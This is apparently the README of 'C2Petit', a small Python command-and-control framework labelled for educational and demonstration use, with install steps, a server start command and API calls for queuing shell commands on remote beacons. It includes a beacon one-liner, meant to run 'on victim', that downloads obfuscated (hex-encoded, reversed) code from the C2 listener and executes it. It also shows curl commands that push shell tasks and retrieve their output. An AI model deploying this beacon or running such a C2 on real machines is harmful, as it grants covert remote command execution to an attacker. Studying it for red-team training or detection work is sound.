#######
C2Petit
#######

| C'est tout petit ! 🐣
| Vanilla asyncio based C2 for systems that support python, for educational & demonstration purpose.

|

.. code-block:: bash

    pipx install git+https://github.com/charlesgargasson/c2petit.git@main
    # pipx uninstall c2petit
    # pipx upgrade c2petit

    # DEV install
    # pipx install /opt/git/c2petit --editable

|

*****
Start
*****

| Start C2 server
| It will start both internal API server "127.0.0.15:7641" and external listener "0.0.0.0:8888"

.. code-block:: bash

    c2p &

    [...] ✨​ API server 127.0.0.15:7641
    [...] 🚀​ New listener 0.0.0.0:8888

|

******
Beacon
******

| Start the beacon on victim

.. code-block:: bash

    python3 -c 'url="localhost:8888";import http.client as h;c=h.HTTPConnection(url);c.request("GET","/");r=c.getresponse();exec(bytes.fromhex(r.read()[::-1].decode())) if r.status==200 else print("failed");_=C(url)'

|

| You will notice a new beacon on c2p side

.. code-block::

    [...] 🌱 Serving new beacon     dc87baf418404777a3a386af33bdf90e

|

****
Task
****

| Use API to add tasks, the only supported action for now is "shell".

.. code-block:: json

    {
        "tasks":[
            {
                "info":{
                    "name": "Run system command sleep"
                },
                "task":{
                    "action": "shell",
                    "cmd": "sleep 10"
                }
            },
            {
                "info":{
                    "name": "Echo text"
                },
                "task":{
                    "action": "shell",
                    "cmd": "echo Hello world !"
                }
            }
        ]
    }

|

| You can use curl to send the task to API

.. code-block:: bash

    BEACON='dc87baf418404777a3a386af33bdf90e'
    curl "127.0.0.15:7641/beacon/update/$BEACON" -H "Content-Type: application/json" --data @update.json
    # 200 {"msg": "Updated"}

|

| You will notice new tasks for beacon on c2p side

.. code-block::

    [...] 📦 New task 'Run system command sleep'               dc87baf418404777a3a386af33bdf90e : 3e118073f93f40468c63ff51013d29d5
    [...] 📦 New task 'Echo text'                              dc87baf418404777a3a386af33bdf90e : 223c52bb28b7460ca774b47987377141

|

| The beacon then sync with c2p and consume all available tasks.

.. code-block::

    [...] 📤 Task delivered 'Run system command sleep'         dc87baf418404777a3a386af33bdf90e : 3e118073f93f40468c63ff51013d29d5
    [...] 📤 Task delivered 'Echo text'                        dc87baf418404777a3a386af33bdf90e : 223c52bb28b7460ca774b47987377141

|

| Each task is asynchronously performed without specific order.
| The beacon wait for the next c2p sync to send results

.. code-block::

    [...] ✅ Task completed 'Echo text'                        dc87baf418404777a3a386af33bdf90e : 43757d15962c4f0eb1bb0d91d9ac2d3f
    [...] ✅ Task completed 'Run system command sleep'         dc87baf418404777a3a386af33bdf90e : 9d049a496f6d4dc1b0662dac94ece744

|

| You can retrieve results from the task object using API

.. code-block::

    BEACON='dc87baf418404777a3a386af33bdf90e'
    TASK='43757d15962c4f0eb1bb0d91d9ac2d3f'
    curl -sS "127.0.0.15:7641/beacon/task/$BEACON/$TASK"|jq

    {
        "info": {
            "name": "Echo text",
            "state": "completed",
            "created": 1753883878.0329168,
            "result": {
                "stdout": "Hello world !\n",
                "stderr": "",
                "completed": 1753883880.642631,
                "returncode": 0
            }
        },
        "task": {
            "action": "shell",
            "cmd": "echo Hello world !"
        }
    }

|

.. code-block::

    curl -sS "127.0.0.15:7641/beacon/task/$BEACON/$TASK"|jq -r .info.result.stdout,.info.result.stderr
    Hello world !

|

****
Stop
****

| Use stop action to stop beacon

.. code-block:: bash

    BEACON='5c4cdcd76029415585b001bab31b947a'
    curl "127.0.0.15:7641/beacon/update/$BEACON" -H "Content-Type: application/json" --data '{"tasks":[{"task":{"action":"stop"},"info":{"name":"STOP"}}]}'

|

| Then use stop endpoint to stop API

.. code-block:: bash

    curl -sS "127.0.0.15:7641/stop" -X POST

|